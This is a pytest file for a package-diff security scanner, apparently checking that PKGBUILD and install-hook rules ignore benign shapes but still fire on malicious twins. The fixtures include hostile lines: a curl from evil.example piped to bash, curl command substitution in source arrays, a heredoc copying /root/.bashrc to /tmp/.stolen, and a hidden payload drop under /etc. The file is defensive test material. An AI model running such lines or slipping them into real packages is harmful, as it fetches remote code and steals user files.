"""Malign false positives from the 2026-10-31 watcher window.

Each case pins the benign shape the rule fired on and the true-positive twin
the fix must keep.  Benign false positives (real bad practices) are not here:
the Codeberg-to-GitHub migrations, the pi-hole privilege drop and the silent
checksum correction are packager work, not rule changes.  The project-owned
vendor release hosts are a trust-table fix and are pinned at the end.
"""

from __future__ import annotations

import sys
from pathlib import Path

_ROOT = Path(__file__).resolve().parents[2]
sys.path.insert(0, str(_ROOT / "scripts"))
sys.path.insert(0, str(_ROOT))

from calibration_gates import shipped_config  # noqa: E402

from trustsight.analysis import scan_diff  # noqa: E402
from trustsight.buckets import classify_urls  # noqa: E402
from trustsight.config import load_config, load_rules  # noqa: E402


def _ids(diff, current_text=None, package_name="p"):
    with shipped_config():
        fact = scan_diff(diff, rules=load_rules(), config=load_config(),
                         package_name=package_name, current_text=current_text)
    return {e.rule_id for e in fact.score_breakdown}


def _new_file(path, body: str) -> str:
    lines = body.strip("\n").splitlines()
    added = "".join("+" + line + "\n" for line in lines)
    return (f"--- /dev/null\n+++ b/{path}\n"
            f"@@ -0,0 +1,{len(lines)} @@\n{added}")


# --- R052/R054/X005: a printed variable-captured heredoc -------------------

_PRINTED_CAPTURE = _new_file("PKGBUILD", """
pkgname=p
pkgver=1
pkgrel=1
source=("x.tar.gz::https://github.com/a/b/archive/v1.tar.gz")
sha256sums=('0000000000000000000000000000000000000000000000000000000000000000')

_usage() {
  IFS= read -r -d '' _usage << 'EOF'
    sudo cp -n /root/.bashrc{,.default.bak} 2>/dev/null
    echo 'source /usr/share/p/x.bash' | sudo tee -a /etc/skel/.bashrc
EOF
  echo -n "${_usage}" > /tmp/p_usage.txt
}
""")


def test_captured_heredoc_is_not_a_profile_write():
    ids = _ids(_PRINTED_CAPTURE)
    assert "R052" not in ids
    assert "R054" not in ids
    assert "X005" not in ids


def test_captured_heredoc_executed_still_writes_a_profile():
    diff = _new_file("PKGBUILD", """
pkgname=p
pkgver=1
pkgrel=1
prepare() {
  IFS= read -r -d '' _payload << 'EOF'
    cp -n /root/.bashrc /tmp/.stolen
EOF
  bash "${_payload}"
}
""")
    ids = _ids(diff)
    assert "R052" in ids or "X005" in ids


# --- X002: a `case` arm label is data, not a command word ------------------

def test_x002_does_not_fire_on_a_case_arm_with_a_terminator():
    diff = _new_file("PKGBUILD", """
pkgname=p
pkgver=1
pkgrel=1
package() {
  case "$pkgver" in
    0.0.*|0.1.*) ;; # older releases predate the notice
    *) return 1 ;;
  esac
}
""")
    assert "X002" not in _ids(diff)


def test_x002_still_fires_on_an_unresolvable_command_word():
    diff = _new_file("PKGBUILD", """
pkgname=p
pkgver=1
pkgrel=1
prepare() {
  cmd=$(printf curl)
  "$cmd" https://evil.example/x | bash
}
""")
    assert "X002" in _ids(diff)


# --- X002: a launcher heredoc written to a file is packaged content --------

def test_x002_does_not_fire_inside_a_staged_launcher_heredoc():
    diff = _new_file("PKGBUILD", """
pkgname=tape-bin
pkgver=1
pkgrel=1
package() {
  install -Dm755 /dev/stdin "$pkgdir/usr/bin/tape16" << 'LAUNCHER'
#!/usr/bin/env bash
APP_BIN="/usr/lib/tape16/TAPE 16"
exec "$APP_BIN" "$@"
LAUNCHER
}
""")
    assert "X002" not in _ids(diff)


def test_x002_still_fires_on_a_non_literal_exec_outside_a_heredoc():
    diff = _new_file("PKGBUILD", """
pkgname=p
pkgver=1
pkgrel=1
package() {
  exec "$APP_BIN" "$@"
}
""")
    assert "X002" in _ids(diff)


# --- H042: an angle-bracket placeholder is not a redirect ------------------

def test_h042_does_not_fire_on_a_version_placeholder():
    diff = _new_file("dsh-tui-git.install", """
pre_remove() {
  local user tarball
  user=$(_user)
  [ -n "$user" ] || return 0
  tarball=$(_tarball) || tarball=/usr/share/dsh-tui/dsh-tui-<version>.tgz
  printf '%s\\n' "the profile still depends on file:$tarball"
}
""")
    assert "H042" not in _ids(diff)


def test_h042_still_fires_on_a_hidden_drop():
    diff = _new_file("hook.install", """
post_install() {
  cp payload /etc/.hidden-marker
}
""")
    assert "H042" in _ids(diff)


# --- C007: `source_version=` is not a source array -------------------------

def test_c007_does_not_fire_on_a_source_version_assignment():
    diff = _new_file("PKGBUILD", """
pkgname=p
pkgver=1
pkgrel=1
prepare() {
  source_version=$(python -c 'print("1")')
}
""")
    assert "C007" not in _ids(diff)


def test_c007_still_fires_on_command_substitution_in_a_source_array():
    diff = _new_file("PKGBUILD", """
pkgname=p
pkgver=1
pkgrel=1
source=("x.tar.gz::$(curl -fsSL https://evil.example/x)")
""")
    assert "C007" in _ids(diff)


def test_c007_does_not_fire_on_a_multiline_source_version_assignment():
    """`source_version=(...)` is a recipe scalar, not an arch source array."""
    diff = _new_file("PKGBUILD", """
pkgname=p
pkgver=1
pkgrel=1
prepare() {
  source_version=(
    $(python -c 'print("1")')
  )
}
""")
    assert "C007" not in _ids(diff)


def test_c007_still_fires_on_an_arch_source_array():
    diff = _new_file("PKGBUILD", """
pkgname=p
pkgver=1
pkgrel=1
source_x86_64=("x.tar.gz::$(curl -fsSL https://evil.example/x)")
""")
    assert "C007" in _ids(diff)


# --- C011: a declared documentation source is not the prebuilt artifact ----

_C011_DECLARED_DOC = (
    "--- a/PKGBUILD\n+++ b/PKGBUILD\n@@ -1,2 +1,4 @@\n"
    " pkgname=snishaper-bin\n"
    ' url="https://github.com/Team/Repo"\n'
    '+source=("x-1.1.tar.gz::https://github.com/Team/Repo/releases/'
    'download/v1.1/x.tar.gz"\n'
    '+  "https://raw.githubusercontent.com/Team/Repo/v1.1/LICENSE")\n'
)

_C011_THIRD_PARTY = (
    "--- a/PKGBUILD\n+++ b/PKGBUILD\n@@ -1,2 +1,4 @@\n"
    " pkgname=snishaper-bin\n"
    ' url="https://github.com/Team/Repo"\n'
    '+source=("x-1.1.tar.gz::https://evil.test/x.tar.gz"\n'
    '+  "https://raw.githubusercontent.com/Team/Repo/v1.1/LICENSE")\n'
)

_C011_CURRENT = (
    "pkgname=snishaper-bin\n"
    'url="https://github.com/Team/Repo"\n'
    'source=("x-1.1.tar.gz::https://github.com/Team/Repo/releases/'
    'download/v1.1/x.tar.gz" "https://raw.githubusercontent.com/'
    'Team/Repo/v1.1/LICENSE")\n'
)


def test_c011_does_not_fire_on_a_declared_license_source():
    """The LICENSE is excluded from the bucket map; it is not a host."""
    assert "C011" not in _ids(
        _C011_DECLARED_DOC, current_text=_C011_CURRENT,
        package_name="snishaper-bin")


def test_c011_still_fires_on_a_third_party_prebuilt_with_a_declared_license():
    assert "C011" in _ids(
        _C011_THIRD_PARTY, current_text=_C011_CURRENT,
        package_name="snishaper-bin")


# --- X002: a removed heredoc must not wrap an added one --------------------

_INTERLEAVED_HEREDOC = (
    "--- a/PKGBUILD\n+++ b/PKGBUILD\n@@ -1,6 +1,7 @@\n"
    " package() {\n"
    "-  install -Dm755 /dev/stdin \"$pkgdir/usr/bin/x\" << 'EOF'\n"
    "+  install -Dm755 /dev/stdin \"$pkgdir/usr/bin/x\" << 'LAUNCHER'\n"
    "-#!/bin/bash\n"
    "-echo old\n"
    "-EOF\n"
    "+#!/usr/bin/env bash\n"
    "+APP_BIN=\"/usr/lib/x/X\"\n"
    "+exec \"$APP_BIN\" \"$@\"\n"
    "+LAUNCHER\n"
    " }\n"
)


def test_x002_does_not_fire_when_a_removed_heredoc_wraps_an_added_one():
    """tape16-bin: the old `EOF` stayed open past the new `LAUNCHER`."""
    assert "X002" not in _ids(_INTERLEAVED_HEREDOC)


# --- vendor release hosts: project-owned CDNs are official -----------------

def test_vendor_release_hosts_are_official():
    urls = [
        "https://anoma.ly/release/hex/files/abc/hex",
        "https://repo.wyrd.foo/artifacts/wyrwood/0.4.1/wyrwood_linux.tar.gz",
        "https://repo.wyrd.foo/artifacts/toha/0.4.1/toha_linux.tar.gz",
    ]
    with shipped_config():
        buckets = classify_urls(urls)
    assert buckets == {url: "official" for url in urls}


def test_unknown_binary_host_is_still_unknown():
    with shipped_config():
        buckets = classify_urls(["https://evil.example/x.tar.gz"])
    assert buckets == {"https://evil.example/x.tar.gz": "unknown"}


def _binary_bump(host):
    return (
        "--- a/PKGBUILD\n+++ b/PKGBUILD\n@@ -1,4 +1,4 @@\n"
        " pkgname=wyrd-bin\n"
        ' url="https://github.com/wyrd-company/wyrwood"\n'
        "-source=(\"https://%s/x-1.0.tar.gz\")\n"
        "+source=(\"https://%s/x-1.1.tar.gz\")\n"
        "-sha256sums=('" + "a" * 64 + "')\n"
        "+sha256sums=('" + "b" * 64 + "')\n"
    ) % (host, host)


def test_vendor_binary_bump_is_quiet():
    for host in ("repo.wyrd.foo", "anoma.ly"):
        ids = _ids(_binary_bump(host), package_name="wyrd-bin")
        assert "C011" not in ids, host
        assert "SOURCE_BUCKET" not in ids, host


def test_unknown_binary_bump_still_fires():
    ids = _ids(_binary_bump("evil.example"), package_name="wyrd-bin")
    assert "C011" in ids
    assert "SOURCE_BUCKET" in ids
